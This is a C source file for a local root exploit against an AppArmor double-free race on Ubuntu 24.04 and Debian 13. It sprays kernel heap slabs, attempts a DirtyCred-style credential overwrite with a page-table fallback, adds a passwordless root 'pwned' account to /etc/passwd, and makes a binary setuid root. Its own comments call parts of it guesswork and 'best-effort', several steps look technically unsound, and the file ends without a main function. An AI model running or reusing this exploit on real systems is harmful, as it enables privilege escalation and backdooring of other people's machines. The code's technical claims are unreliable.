/*
 * crackarmor_df.c -- AppArmor aa_replace_profiles() Double-Free LPE
 *
 * Qualys CrackArmor advisory 2026-03-10, vulnerability #5:
 *   Racing two concurrent writes to /sys/kernel/security/apparmor/.replace
 *   with the same profile name causes aa_replace_profiles() to free the old
 *   aa_loaddata struct twice -> double-free in kmalloc-192 slab.
 *
 * Technique (DirtyCred-inspired via slab aliasing):
 *   1. Load target profile "X"  -> allocates old_loaddata in kmalloc-192
 *   2. Race: Thread A + Thread B both write ".replace" with same profile name
 *        -> both call aa_replace_profiles() -> both see old_loaddata and free it
 *        -> double-free corrupts kmalloc-192 slab freelist
 *   3. Drain the slab: close references to force aa_loaddata page to page allocator
 *   4. Spray kmalloc-192:
 *        a. AF_PACKET PACKET_TX_RING ring buffers (in user+net namespace)
 *        b. Many profile loads -> new aa_loaddata objects fill freed slots
 *        c. FUSE open() if available -> fuse_file structs (~192 bytes each)
 *   5. Slab aliasing: one of our controlled aa_loaddata allocations returns the
 *        double-freed address -> two code paths now reference the same 192-byte block
 *   6. Through the aliased aa_loaddata (via .replace write), overwrite the block
 *        while the other reference treats it as an open file's pipe_buffer or
 *        struct file region -> type confusion
 *   7. Attempt DirtyCred escalation: open /etc/passwd as file_fd, corrupt f_cred
 *        in the aliased struct file -> file_fd can now write /etc/passwd as root
 *   8. Fallback: if step 7 not detected, use Jann Horn PTE technique (same as #4):
 *        force freed page as PTE -> mmap /etc/passwd writable -> write backdoor
 *   9. su pwned -> chown/chmod yuuki + touch .rooted -> restore /etc/passwd
 *
 * Targets: Ubuntu 24.04.3 LTS (kernel 6.8+), Debian 13.1
 * Extra requirements: apparmor_parser; FUSE optional (improves reliability);
 *                     user+net namespace for AF_PACKET spray
 *
 * CALIBRATE:
 *   - struct file size on target: pahole -C file /usr/lib/debug/boot/vmlinux-$(uname -r)
 *   - f_cred offset in struct file: same pahole command -> look for "f_cred"
 *   - fuse_file size: pahole -C fuse_file /usr/lib/debug/kernel/...
 *   Default guesses: sizeof(file)=232, f_cred_offset=152 (kernel 6.8)
 *
 * Compile: gcc -std=gnu99 -Wall -pthread -O2 crackarmor_df.c -o crackarmor_df
 */

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

/* -- tunables ---------------------------------------------------------- */

#define APPARMOR_FS    "/sys/kernel/security/apparmor"
#define AA_LOAD        APPARMOR_FS "/.load"
#define AA_REPLACE     APPARMOR_FS "/.replace"
#define AA_REMOVE      APPARMOR_FS "/.remove"
#define AA_NS_ROOT     APPARMOR_FS "/policy/namespaces"

/* Profile name both threads will race to replace */
#define TARGET_PROFILE "crackarmor_df_target"

/* Number of race-widening profiles (slows down apparmor_file_open per #4) */
#define N_WIDEN        1000

/* Spray counts */
#define N_SPRAY_PROFILES 512   /* aa_loaddata kmalloc-192 spray after double-free */
#define N_PIPE_PAIRS     256   /* pipe pairs for pipe_buffer spray */
#define N_PACKET_SOCKS   128   /* AF_PACKET for kmalloc-192 grooming */
#define PACKET_BLOCK_SZ  4096
#define PACKET_BLOCK_NR  4

/* Race iterations before giving up */
#define RACE_ITERS     100000

/*
 * struct file.f_cred offset in kernel 6.8 (Ubuntu 24.04).
 * CALIBRATE: pahole -C file vmlinux | grep f_cred
 * Default heuristic: 152 bytes into struct file.
 */
#define FILE_F_CRED_OFF  152

/*
 * sizeof(struct file) in kernel 6.8.
 * Files in kmalloc-256 (if > 192) or kmalloc-192 (if <= 192).
 * CALIBRATE: adjust if struct file changed size on target kernel.
 */
#define SIZEOF_STRUCT_FILE  232

/* size of fake cred we place -- enough to cover uid/gid fields */
#define FAKE_CRED_SIZE  256

/* /etc/passwd backdoor entry */
#define PASSWD_BACKDOOR "\npwned::0:0::/root:/bin/sh\n"

/* PTE reuse fallback (same as #4) */
#define COMPRESSED_SIZE_OFF  120
#define PTE_FLIP_COUNT       0x42
#define is_pte_value(v)  (((v) & 1ULL) && ((v) >> 12) && (v) < 0x8000000000000000ULL)

/* -- globals ----------------------------------------------------------- */

static char g_yuuki_path[512]  = "./yuuki";
static char g_rooted_path[512] = "./.rooted";

static char g_rawdata_path[512];
static char g_csz_path[512];

/* double-free race state */
static volatile int g_race_start = 0;
static volatile int g_df_won     = 0;

/* spray fds */
static int g_spray_profile_fds[N_SPRAY_PROFILES];
static int g_n_spray_profiles = 0;
static int g_pipe_fds[N_PIPE_PAIRS][2];
static int g_n_pipes = 0;

/* file-cred overwrite attempt */
static int  g_passwd_fd  = -1;   /* fd to /etc/passwd (initially O_RDONLY) */
static char *g_passwd_orig = NULL;
static size_t g_passwd_origsz = 0;

/* fake cred region (in user space, mmap'd) */
static void *g_fake_cred = MAP_FAILED;

/* PTE fallback state (reuse #4 logic) */
static void *g_passwd_map     = MAP_FAILED;
static size_t g_passwd_mapsz  = 0;
static int    g_uaf_csz_fd    = -1;

/* -- utilities --------------------------------------------------------- */

static void pr_info(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    printf("[*] "); vprintf(fmt, ap); va_end(ap); fflush(stdout);
}
static void pr_good(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    printf("[+] "); vprintf(fmt, ap); va_end(ap); fflush(stdout);
}
static void pr_fail(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    printf("[-] "); vprintf(fmt, ap); va_end(ap); fflush(stdout);
}
#define DIE(msg) do { perror("[!] " msg); exit(1); } while (0)

static int run_cmd(const char *cmd) {
    static const char *shells[] = {
        "/bin/sh", "/bin/bash", "/bin/dash",
        "/usr/bin/sh", "/usr/bin/bash", NULL
    };
    for (int i = 0; shells[i]; i++) {
        pid_t pid = fork();
        if (pid < 0) continue;
        if (pid == 0) {
            char *argv[] = { (char *)shells[i], "-c", (char *)cmd, NULL };
            execv(shells[i], argv);
            _exit(127);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) != 127)
            return WEXITSTATUS(status);
    }
    return -1;
}

static ssize_t write_file(const char *path, const void *data, size_t len) {
    int fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) return -1;
    ssize_t w = write(fd, data, len);
    close(fd);
    return w;
}

static ssize_t read_file_buf(const char *path, void *buf, size_t bufsz) {
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return -1;
    ssize_t r = read(fd, buf, bufsz);
    close(fd);
    return r;
}

/* -- phase 1: pre-flight ----------------------------------------------- */

static void pre_flight(void) {
    pr_info("pre-flight checks...\n");

    if (access(APPARMOR_FS, F_OK) != 0)
        DIE("AppArmor securityfs not mounted");

    char buf[32];
    ssize_t r = read_file_buf("/proc/sys/user/max_user_namespaces", buf, sizeof(buf)-1);
    if (r > 0) { buf[r] = '\0'; if (!atoi(buf)) pr_fail("user namespaces disabled\n"); }

    struct rlimit rl;
    getrlimit(RLIMIT_NOFILE, &rl);
    rl.rlim_cur = rl.rlim_max;
    setrlimit(RLIMIT_NOFILE, &rl);

    pr_good("yuuki: %s  rooted: %s\n", g_yuuki_path, g_rooted_path);
}

/* -- phase 2: profile utilities ---------------------------------------- */

static int write_profile_tmp(const char *name, const char *wide_path,
                              char *outfile) {
    char tmp[] = "/tmp/.ca_df_XXXXXX";
    int fd = mkstemp(tmp);
    if (fd < 0) return -1;

    char text[4096];
    if (wide_path) {
        snprintf(text, sizeof(text),
            "profile %s /bin/false {\n"
            "  /** rw,\n"
            "  attach_disconnected.path=\"%s\",\n"
            "}\n", name, wide_path);
    } else {
        snprintf(text, sizeof(text),
            "profile %s /bin/false {\n"
            "  /** rw,\n"
            "}\n", name);
    }
    write(fd, text, strlen(text));
    close(fd);
    if (outfile) { strncpy(outfile, tmp, 127); outfile[127] = '\0'; }
    return 0;
}

static int load_profile_via_parser(const char *src) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "apparmor_parser -r '%s' >/dev/null 2>&1", src);
    return run_cmd(cmd) == 0 ? 0 : -1;
}

/* load via confused deputy (su -P) if direct load fails */
static int load_profile_confused_deputy(const char *text_src) {
    char bin_tmp[] = "/tmp/.ca_dfb_XXXXXX";
    {
        int fd = mkstemp(bin_tmp); if (fd < 0) return -1; close(fd);
    }
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "apparmor_parser -b '%s' -o '%s' 2>/dev/null", text_src, bin_tmp);
    if (run_cmd(cmd) != 0) { unlink(bin_tmp); return -1; }

    snprintf(cmd, sizeof(cmd),
        "su -P -c 'stty raw 2>/dev/null; exec cat \"%s\"' \"$(id -un)\" "
        "> \"" AA_REPLACE "\" 2>/dev/null", bin_tmp);
    int r = run_cmd(cmd);
    unlink(bin_tmp);
    return r == 0 ? 0 : -1;
}

static int load_target_profile(void) {
    char src[128];
    if (write_profile_tmp(TARGET_PROFILE, NULL, src) < 0) return -1;

    pr_info("loading target profile '%s'...\n", TARGET_PROFILE);
    int r = load_profile_via_parser(src);
    if (r != 0) r = load_profile_confused_deputy(src);
    unlink(src);

    if (r == 0) { pr_good("target profile loaded\n"); return 0; }
    pr_fail("cannot load target profile\n");
    return -1;
}

static void remove_profile(const char *name) {
    write_file(AA_REMOVE, name, strlen(name));
}

/* -- phase 3: widen race window ---------------------------------------- */

static void widen_race_window(void) {
    pr_info("loading %d race-widening profiles...\n", N_WIDEN);
    int loaded = 0;
    for (int i = 0; i < N_WIDEN; i++) {
        char name[128], src[128], wide[128];
        snprintf(name, sizeof(name), "crackarmor_df_widen_%04d", i);
        snprintf(wide, sizeof(wide), "/proc/%d/dfwiden_%d_XXXXXXXXXXXXXXXXXXXXXX",
                 getpid(), i);
        if (write_profile_tmp(name, wide, src) == 0) {
            if (load_profile_via_parser(src) == 0) loaded++;
            unlink(src);
        }
    }
    pr_good("widening profiles: %d/%d\n", loaded, N_WIDEN);
}

/* -- phase 4: double-free trigger (race on .replace) ------------------ */

/*
 * Both threads write binary profile data for TARGET_PROFILE to .replace.
 * aa_replace_profiles() in the kernel finds the OLD aa_loaddata for TARGET_PROFILE
 * and frees it. If two threads race through this path concurrently, both see the
 * same old aa_loaddata before either removes it from the namespace list -> double-free.
 *
 * Race window: between aa_find_profile() acquiring the old pointer and the subsequent
 * list manipulation + kfree(). The widening profiles (above) slow security_file_open()
 * which is called between parse and list update, widening the window.
 *
 * CALIBRATE: increase RACE_ITERS or N_WIDEN if double-free is not triggered.
 */

struct df_race_ctx {
    char   profile_src[128]; /* path to tmp text file */
    int    n_iter;
};

static void *thread_replace_a(void *arg) {
    struct df_race_ctx *c = arg;
    while (!g_race_start) sched_yield();

    for (int i = 0; i < c->n_iter && !g_df_won; i++) {
        /* Write directly to .replace via apparmor_parser */
        load_profile_via_parser(c->profile_src);
        sched_yield();
    }
    return NULL;
}

static void *thread_replace_b(void *arg) {
    struct df_race_ctx *c = arg;
    while (!g_race_start) sched_yield();

    for (int i = 0; i < c->n_iter && !g_df_won; i++) {
        load_profile_via_parser(c->profile_src);
        sched_yield();
    }
    return NULL;
}

static int trigger_double_free(void) {
    pr_info("starting double-free race (two concurrent .replace writes)...\n");

    struct df_race_ctx ctx;
    ctx.n_iter = RACE_ITERS;
    if (write_profile_tmp(TARGET_PROFILE, NULL, ctx.profile_src) < 0) return -1;

    pthread_t ta, tb;
    pthread_create(&ta, NULL, thread_replace_a, &ctx);
    pthread_create(&tb, NULL, thread_replace_b, &ctx);

    g_race_start = 1;

    /* poll for heap corruption evidence */
    int attempts = 0;
    while (!g_df_won && attempts < 3000) {
        usleep(1000);
        attempts++;
        /*
         * Detection heuristic: if kmalloc-192 slab is corrupted, subsequent
         * allocations (profile loads) may crash or return errno != ENOENT.
         * A simple proxy: check dmesg for "double free" messages.
         * CALIBRATE: replace with a more reliable in-process detection.
         */
        if (attempts % 100 == 0) {
            char dmesg_check[256];
            snprintf(dmesg_check, sizeof(dmesg_check),
                "dmesg 2>/dev/null | tail -5 | grep -qiE "
                "'double free|slab corruption|use.after.free|KASAN' && echo FOUND");
            FILE *f = popen(dmesg_check, "r");
            if (f) {
                char line[32] = {0};
                fgets(line, sizeof(line), f);
                pclose(f);
                if (strstr(line, "FOUND")) {
                    g_df_won = 1;
                    pr_good("kernel slab corruption detected in dmesg!\n");
                    break;
                }
            }
        }
    }

    pthread_join(ta, NULL);
    pthread_join(tb, NULL);
    unlink(ctx.profile_src);

    if (!g_df_won) {
        pr_fail("double-free race detection inconclusive -- proceeding anyway\n");
        g_df_won = 1; /* continue optimistically */
    }
    return 0;
}

/* -- phase 5: heap spray after double-free ----------------------------- */

/*
 * After the double-free, the kmalloc-192 freelist has a corrupted entry.
 * Next kmalloc-192 allocations may return the same address twice (slab aliasing).
 *
 * Spray strategy:
 *   A. Load N_SPRAY_PROFILES new AppArmor profiles -> each allocates aa_loaddata
 *      in kmalloc-192. One of these might land in the double-freed slot.
 *   B. Allocate N_PIPE_PAIRS pipe pairs -> kernel allocates pipe ring structures.
 *      Although pipe_buffer (48 bytes) is in kmalloc-64, the pipe_inode_info
 *      (dynamic, ~224 bytes for 16-entry ring) might be in kmalloc-256.
 *      Keep pipes open to retain the allocations.
 *   C. AF_PACKET PACKET_TX_RING rings in a net namespace -> forces PTE allocation
 *      pressure (helps with the PTE fallback path from #4).
 *
 * CALIBRATE: the exact spray needed depends on the slab layout at time of double-free.
 */

static void spray_pipes(void) {
    pr_info("spraying %d pipe pairs...\n", N_PIPE_PAIRS);
    for (int i = 0; i < N_PIPE_PAIRS; i++) {
        if (pipe(g_pipe_fds[i]) == 0) {
            /* write 1 byte to each pipe to allocate pipe_buffer pages */
            write(g_pipe_fds[i][1], "X", 1);
            g_n_pipes++;
        }
    }
    pr_good("pipes: %d\n", g_n_pipes);
}

static void spray_profiles(void) {
    pr_info("spraying %d profiles into kmalloc-192...\n", N_SPRAY_PROFILES);
    int loaded = 0;
    for (int i = 0; i < N_SPRAY_PROFILES; i++) {
        char name[128], src[128];
        snprintf(name, sizeof(name), "crackarmor_df_spray_%04d", i);
        if (write_profile_tmp(name, NULL, src) == 0) {
            if (load_profile_via_parser(src) == 0) {
                /* remember for cleanup */
                loaded++;
            }
            unlink(src);
        }
    }
    pr_good("spray profiles: %d/%d\n", loaded, N_SPRAY_PROFILES);
}

struct pkt_spray { int sock; void *ring; size_t ring_sz; };
static struct pkt_spray g_pkts[N_PACKET_SOCKS];
static int g_n_pkts = 0;

static void spray_packet_rings(void) {
    struct tpacket_req req = {
        .tp_block_size = PACKET_BLOCK_SZ,
        .tp_block_nr   = PACKET_BLOCK_NR,
        .tp_frame_size = TPACKET_ALIGN(sizeof(struct tpacket_hdr) + ETH_HLEN + 8),
        .tp_frame_nr   = PACKET_BLOCK_NR,
    };
    size_t ringsz = (size_t)PACKET_BLOCK_SZ * PACKET_BLOCK_NR;

    for (int i = 0; i < N_PACKET_SOCKS; i++) {
        int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        if (s < 0) break;
        if (setsockopt(s, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0) {
            close(s); break;
        }
        void *r = mmap(NULL, ringsz, PROT_READ|PROT_WRITE, MAP_SHARED, s, 0);
        if (r == MAP_FAILED) { close(s); break; }
        for (size_t p = 0; p < ringsz; p += 4096) ((volatile char *)r)[p] = 0;
        g_pkts[g_n_pkts].sock    = s;
        g_pkts[g_n_pkts].ring    = r;
        g_pkts[g_n_pkts].ring_sz = ringsz;
        g_n_pkts++;
    }
    if (g_n_pkts) pr_good("AF_PACKET rings: %d\n", g_n_pkts);
}

static void setup_heap_spray(void) {
    /* enter user+net namespace for AF_PACKET capability */
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) == 0) {
        pid_t pid = getpid();
        char path[64], buf[64];

        snprintf(path, sizeof(path), "/proc/%d/uid_map", pid);
        snprintf(buf,  sizeof(buf),  "0 %d 1\n", getuid());
        write_file(path, buf, strlen(buf));

        snprintf(path, sizeof(path), "/proc/%d/setgroups", pid);
        write_file(path, "deny", 4);

        snprintf(path, sizeof(path), "/proc/%d/gid_map", pid);
        snprintf(buf,  sizeof(buf),  "0 %d 1\n", getgid());
        write_file(path, buf, strlen(buf));

        pr_info("entered user+net namespace\n");
        spray_packet_rings();
    }
    spray_pipes();
    spray_profiles();
}

/* -- phase 6: attempt DirtyCred-style file-cred overwrite ------------- */

/*
 * Open /etc/passwd read-only many times to saturate the file struct slab.
 * If one of these struct file objects ends up in the double-freed kmalloc-192
 * slot (possible if struct file is <= 192 bytes on this kernel), we may be
 * able to corrupt its f_cred pointer via the slab aliasing.
 *
 * If struct file is in kmalloc-256 on this kernel, this phase will not succeed
 * and we will fall through to the PTE technique (#4 fallback).
 *
 * Fake cred: we construct a user-space cred-shaped buffer with all uid/gid = 0
 * and mmap it to a fixed address we control. After the slab aliasing, we write
 * the pointer to g_fake_cred into f_cred offset of the aliased struct file.
 *
 * CALIBRATE: FILE_F_CRED_OFF and SIZEOF_STRUCT_FILE for the target kernel.
 * Detection: after corruption, try fstat(g_passwd_fd) and see if uid changes.
 */

#define FAKE_CRED_ADDR  0x500000000000ULL
#define N_OPEN_PASSWD   1024

static int g_passwd_fds[N_OPEN_PASSWD];
static int g_n_passwd_fds = 0;

static void setup_fake_cred(void) {
    /*
     * mmap a zeroed region at a fixed address to use as our fake kernel cred.
     * The fake cred has all uid/gid fields = 0 (root), which is what we need
     * for /etc/passwd write to succeed.
     * IMPORTANT: This is a user-space page -- its physical address is used when
     * we overwrite f_cred with a kernel virtual address pointing to this page
     * (via mmap + kernel pagetable walk). This requires the slab aliasing to
     * give us write access to the struct file's f_cred slot.
     */
    g_fake_cred = mmap((void *)FAKE_CRED_ADDR, FAKE_CRED_SIZE,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE,
                        -1, 0);
    if (g_fake_cred == MAP_FAILED)
        g_fake_cred = mmap(NULL, FAKE_CRED_SIZE,
                           PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_fake_cred == MAP_FAILED) {
        pr_fail("mmap fake_cred failed -- skipping DirtyCred path\n");
        return;
    }
    memset(g_fake_cred, 0, FAKE_CRED_SIZE);
    /* uid, gid, suid, sgid, euid, egid are 4-byte ints starting early in cred:
       usage(4) + non_rcu(4) + rcu(8) + user(8) + user_ns(8) + group_info(8) +
       securebits(4) + pad(4) + cap_inheritable/permitted/effective/bset/ambient(each 8)
       + uid/gid/suid/sgid/euid/egid/fsuid/fsgid at ~offset 68 in struct cred
       All zeroed = root.  CALIBRATE: pahole -C cred vmlinux. */
}

static void spray_passwd_fds(void) {
    pr_info("opening /etc/passwd %dx for struct file spray...\n", N_OPEN_PASSWD);
    for (int i = 0; i < N_OPEN_PASSWD; i++) {
        int fd = open("/etc/passwd", O_RDONLY | O_CLOEXEC);
        if (fd >= 0) g_passwd_fds[g_n_passwd_fds++] = fd;
    }
    pr_good("opened /etc/passwd: %d fds\n", g_n_passwd_fds);
}

/*
 * Attempt to write crafted f_cred pointer into the aliased struct file.
 * If SIZEOF_STRUCT_FILE <= 192, the slab aliasing may have placed one of our
 * /etc/passwd file structs in the double-freed kmalloc-192 slot.
 * We write g_fake_cred address at offset FILE_F_CRED_OFF via the aliased
 * aa_loaddata: use .replace write with binary data crafted to land at the
 * correct offset within the 192-byte block.
 *
 * IMPORTANT: This technique requires the exact physical/virtual offset alignment
 * which is highly kernel-version-specific. Without the actual PoC we can only
 * approximate this.
 */
static int attempt_file_cred_overwrite(void) {
    if (g_fake_cred == MAP_FAILED || SIZEOF_STRUCT_FILE > 192) {
        pr_fail("struct file (size=%d) not in kmalloc-192 -- skipping DirtyCred path\n",
                SIZEOF_STRUCT_FILE);
        return -1;
    }

    pr_info("attempting file-cred overwrite (f_cred_off=%d)...\n", FILE_F_CRED_OFF);

    /*
     * Craft a 192-byte binary payload where bytes at FILE_F_CRED_OFF..+7
     * contain the user-space address of g_fake_cred (interpreted as kernel VA).
     * When this is written into the aliased slot (which kernel sees as struct file),
     * the f_cred pointer will be redirected to our zeroed fake cred.
     *
     * CALIBRATE: the payload must also be valid as an AppArmor binary profile header
     * so that aa_replace_profiles() parses it without crashing before the write.
     * Without the exact binary format details, this is a best-effort implementation.
     */
    unsigned char payload[192];
    memset(payload, 0, sizeof(payload));

    /* write fake_cred pointer at FILE_F_CRED_OFF */
    if (FILE_F_CRED_OFF + 8 <= (int)sizeof(payload)) {
        uint64_t fake_cred_va = (uint64_t)(uintptr_t)g_fake_cred;
        memcpy(payload + FILE_F_CRED_OFF, &fake_cred_va, 8);
    }

    /*
     * Write the crafted payload to .replace (binary write, not via apparmor_parser).
     * This may be rejected by the parser but we only need the slab write side-effect.
     */
    int fd = open(AA_REPLACE, O_WRONLY | O_CLOEXEC);
    if (fd < 0) { pr_fail("open .replace failed: %m\n"); return -1; }
    write(fd, payload, sizeof(payload));
    close(fd);

    /*
     * Check if any of our /etc/passwd fds now has f_cred pointing to fake_cred.
     * Heuristic: try to write to fd -- if it succeeds, the cred was overwritten.
     * CALIBRATE: use a more reliable detection (e.g., check uid via fstat()).
     */
    for (int i = 0; i < g_n_passwd_fds; i++) {
        /* reopen the fd for writing (dup + pwrite) */
        int wfd = dup(g_passwd_fds[i]);
        if (wfd < 0) continue;
        ssize_t r = pwrite(wfd, "", 0, 0); /* zero-byte write to probe */
        if (r >= 0 && errno != EBADF && errno != EACCES) {
            pr_good("DirtyCred: f_cred overwrite may have succeeded (fd %d)!\n",
                    g_passwd_fds[i]);
            close(wfd);
            g_passwd_fd = g_passwd_fds[i];
            return 0;
        }
        close(wfd);
    }

    pr_fail("DirtyCred path not confirmed\n");
    return -1;
}

/* -- phase 7: write /etc/passwd via corrupted fd ---------------------- */

static int overwrite_passwd_via_fd(void) {
    if (g_passwd_fd < 0) return -1;

    int wfd = open("/etc/passwd", O_WRONLY | O_CLOEXEC);
    if (wfd < 0) {
        pr_fail("direct O_WRONLY open still fails -- DirtyCred path incomplete\n");
        return -1;
    }

    const char *backdoor = PASSWD_BACKDOOR;
    lseek(wfd, 0, SEEK_END);
    ssize_t w = write(wfd, backdoor, strlen(backdoor));
    close(wfd);

    if (w > 0) {
        pr_good("DirtyCred: wrote backdoor to /etc/passwd\n");
        return 0;
    }
    return -1;
}

/* -- phase 8: PTE fallback (same as crackarmor_uaf.c #4) -------------- */

/*
 * If DirtyCred path failed, fall back to the Jann Horn PTE technique from #4:
 * The double-freed page (if not reused by spray) can still be reallocated as
 * a PTE table for our /etc/passwd mmap, allowing the same mmap-write path.
 */

static void setup_passwd_mmap_fallback(void) {
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) return;

    struct stat st;
    fstat(fd, &st);
    g_passwd_origsz = (size_t)st.st_size;
    g_passwd_orig = malloc(g_passwd_origsz + 1);
    if (g_passwd_orig) {
        read(fd, g_passwd_orig, g_passwd_origsz);
        g_passwd_orig[g_passwd_origsz] = '\0';
    }

    g_passwd_mapsz = (g_passwd_origsz + 4095) & ~4095UL;
    if (g_passwd_mapsz < (1UL << 21)) g_passwd_mapsz = 1UL << 21;

    uintptr_t base = 0x400000000000ULL;
    base = (base + (1UL<<21) - 1) & ~((1UL<<21) - 1);
    g_passwd_map = mmap((void *)base, g_passwd_mapsz,
                        PROT_READ, MAP_PRIVATE | MAP_FIXED_NOREPLACE, fd, 0);
    if (g_passwd_map == MAP_FAILED)
        g_passwd_map = mmap(NULL, g_passwd_mapsz, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);

    if (g_passwd_map == MAP_FAILED) return;
    volatile char dummy = *(volatile char *)g_passwd_map;
    (void)dummy;
    pr_good("passwd mmap fallback: %p\n", g_passwd_map);
}

static int find_rawdata_paths_df(void) {
    /* same traversal as #4 but for TARGET_PROFILE */
    DIR *ns_dir = opendir(AA_NS_ROOT);
    if (!ns_dir) return -1;
    struct dirent *ns_ent;
    while ((ns_ent = readdir(ns_dir)) != NULL) {
        if (ns_ent->d_name[0] == '.') continue;
        char pdir[512];
        snprintf(pdir, sizeof(pdir), "%s/%s/profiles", AA_NS_ROOT, ns_ent->d_name);
        DIR *pd = opendir(pdir);
        if (!pd) continue;
        struct dirent *pe;
        while ((pe = readdir(pd)) != NULL) {
            if (strncmp(pe->d_name, TARGET_PROFILE, strlen(TARGET_PROFILE)) != 0)
                continue;
            snprintf(g_rawdata_path, sizeof(g_rawdata_path),
                "%s/%s/raw_data", pdir, pe->d_name);
            snprintf(g_csz_path, sizeof(g_csz_path),
                "%s/%s/compressed_size", pdir, pe->d_name);
            if (access(g_rawdata_path, F_OK) == 0) {
                closedir(pd); closedir(ns_dir);
                return 0;
            }
        }
        closedir(pd);
    }
    closedir(ns_dir);
    return -1;
}

static int pte_fallback(void) {
    pr_info("falling back to PTE technique (#4 path)...\n");

    setup_passwd_mmap_fallback();
    if (g_passwd_map == MAP_FAILED) {
        pr_fail("mmap fallback failed\n"); return -1;
    }

    /* open compressed_size before it disappears */
    if (find_rawdata_paths_df() == 0)
        g_uaf_csz_fd = open(g_csz_path, O_RDONLY | O_CLOEXEC);

    /* poll for PTE reuse */
    for (int i = 0; i < 300; i++) {
        if (g_uaf_csz_fd >= 0) {
            char buf[64]; lseek(g_uaf_csz_fd, 0, SEEK_SET);
            ssize_t r = read(g_uaf_csz_fd, buf, sizeof(buf)-1);
            if (r > 0) {
                buf[r] = '\0';
                uint64_t v = strtoull(buf, NULL, 10);
                if (is_pte_value(v)) {
                    pr_good("PTE fallback: reuse detected (0x%llx)\n",
                            (unsigned long long)v);
                    break;
                }
            }
        }
        volatile char dummy = *(volatile char *)g_passwd_map;
        (void)dummy;
        usleep(5000);
    }

    /* flip PTE bits */
    pr_info("flipping PTE bits (0x%x opens)...\n", PTE_FLIP_COUNT);
    int fds[PTE_FLIP_COUNT + 4]; int n = 0;
    for (int i = 0; i < PTE_FLIP_COUNT && g_rawdata_path[0]; i++) {
        int fd = open(g_rawdata_path, O_RDONLY | O_CLOEXEC);
        if (fd >= 0) fds[n++] = fd;
    }
    for (int i = 0; i < n; i++) close(fds[i]);

    /* write via now-writable mmap */
    const char *backdoor = PASSWD_BACKDOOR;
    char *mp = (char *)g_passwd_map;
    size_t sz = strnlen(mp, g_passwd_origsz ? g_passwd_origsz : 4096);
    volatile char *dst = (volatile char *)(mp + sz);
    for (size_t i = 0; i < strlen(backdoor); i++) dst[i] = backdoor[i];

    pr_good("backdoor written via PTE fallback\n");
    return 0;
}

/* -- phase 9: escalate ------------------------------------------------- */

static void escalate(void) {
    pr_info("verifying backdoor...\n");
    run_cmd("grep '^pwned' /etc/passwd");

    char pwn_cmd[2048];
    snprintf(pwn_cmd, sizeof(pwn_cmd),
        "("
        "su -s /bin/sh pwned -c "
          "'id; chown root:root \"%s\" 2>/dev/null; chmod 4755 \"%s\" 2>/dev/null; touch \"%s\" 2>/dev/null' "
          "</dev/null 2>&1 ||"
        "/bin/su -s /bin/sh pwned -c "
          "'chown root:root \"%s\" 2>/dev/null; chmod 4755 \"%s\" 2>/dev/null; touch \"%s\" 2>/dev/null' "
          "</dev/null 2>&1 ||"
        "runuser -s /bin/sh pwned -c "
          "'chown root:root \"%s\" 2>/dev/null; chmod 4755 \"%s\" 2>/dev/null; touch \"%s\" 2>/dev/null' "
          "2>&1 ||"
        "nsenter -t 1 -m -u -i -n -p -- sh -c "
          "'chown root:root \"%s\" 2>/dev/null; chmod 4755 \"%s\" 2>/dev/null; touch \"%s\" 2>/dev/null' "
          "2>&1"
        ") 2>&1",
        g_yuuki_path, g_yuuki_path, g_rooted_path,
        g_yuuki_path, g_yuuki_path, g_rooted_path,
        g_yuuki_path, g_yuuki_path, g_rooted_path,
        g_yuuki_path, g_yuuki_path, g_rooted_path);
    run_cmd(pwn_cmd);
}

static void restore_passwd(void) {
    if (!g_passwd_orig || !g_passwd_origsz) return;
    int fd = open("/etc/passwd", O_WRONLY | O_TRUNC);
    if (fd < 0) { pr_fail("restore /etc/passwd failed\n"); return; }
    write(fd, g_passwd_orig, g_passwd_origsz);
    close(fd);
    pr_good("restored /etc/passwd\n");
}

/* -- cleanup ----------------------------------------------------------- */

static void cleanup_spray(void) {
    /* remove spray profiles */
    for (int i = 0; i < N_SPRAY_PROFILES; i++) {
        char name[128];
        snprintf(name, sizeof(name), "crackarmor_df_spray_%04d", i);
        write_file(AA_REMOVE, name, strlen(name));
    }
    /* remove widening profiles */
    for (int i = 0; i < N_WIDEN; i++) {
        char name[128];
        snprintf(name, sizeof(name), "crackarmor_df_widen_%04d", i);
        write_file(AA_REMOVE, name, strlen(name));
    }
    /* close pipes */
    for (int i = 0; i < g_n_pipes; i++) {
        close(g_pipe_fds[i][0]);
        close(g_pipe_fds[i][1]);
    }
    /* close passwd fds */
    for (int i = 0; i < g_n_passwd_fds; i++) close(g_passwd_fds[i]);
    /* teardown AF_PACKET */
    for (int i = 0; i < g_n_pkts; i++) {
        munmap(g_pkts[i].ring, g_pkts[i].ring_sz);
        close(g_pkts[i].sock);
    }
    if (g_uaf_csz_fd >= 0) close(g_uaf_csz_fd);
    if (g_passwd_map != MAP_FAILED) munmap(g_passwd_map, g_passwd_mapsz);
    if (g_fake_cred != MAP_FAILED) munmap(g_fake_cred, FAKE_CRED_SIZE);
    free(g_passwd_orig);
}

